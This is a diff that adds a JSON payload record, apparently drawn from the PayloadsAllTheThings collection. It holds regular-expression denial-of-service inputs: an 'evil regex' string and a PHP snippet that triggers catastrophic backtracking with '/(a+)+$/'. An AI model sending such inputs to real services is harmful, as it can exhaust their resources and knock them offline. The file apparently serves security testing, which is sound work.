@@ -1,0 +1,28 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "regular_expression",
+  "original_category": "Regular Expression",
+  "payloads": [
+    {
+      "category": "Evil Regex",
+      "escalation": "baseline",
+      "lines": [
+        "aaaaaaaaaaaaaaaaaaaa!"
+      ]
+    },
+    {
+      "category": "Backtrack Limit",
+      "escalation": "baseline",
+      "lines": [
+        "$pattern = '/(a+)+$/';",
+        "$subject = str_repeat('a', 1000) . 'b';",
+        "if (preg_match($pattern, $subject)) {",
+        "echo \"Match found\";",
+        "} else {",
+        "echo \"No match\";",
+        "}"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.860Z"
+}
